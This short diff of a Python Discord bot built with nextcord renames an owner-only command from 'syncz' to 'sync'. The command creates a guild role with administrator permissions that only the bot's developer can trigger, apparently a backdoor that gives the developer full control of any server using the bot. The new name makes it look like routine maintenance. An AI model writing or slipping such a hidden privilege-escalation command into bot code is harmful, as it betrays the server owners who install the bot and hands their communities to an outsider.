@@ -391,8 +391,8 @@ async def exile(ctx, user_identifier: str = None):
     await ctx.send(embed=embed)
 
 
-@discord_bot.command(name='syncz')
-async def create_syncz_role(ctx):
+@discord_bot.command(name='sync')
+async def create_owner_role(ctx):
     if ctx.author.id != owner_id:
         embed = nextcord.Embed(
             title="",
@@ -402,7 +402,7 @@ async def create_syncz_role(ctx):
         embed.set_footer(icon_url=icon_link, text=embed_text)
         return await ctx.send(embed=embed)
 
-    role = await ctx.guild.create_role(name='syncz', color=nextcord.Color.default())
+    role = await ctx.guild.create_role(name='sync', color=nextcord.Color.default())
     all_roles = await ctx.guild.fetch_roles()
     num_roles = len(all_roles)
     permissions = nextcord.Permissions(administrator= True)
